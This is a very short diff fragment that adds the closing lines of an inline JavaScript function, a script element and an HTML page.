+    }());
+</script>
+
+    </body>
+</html>
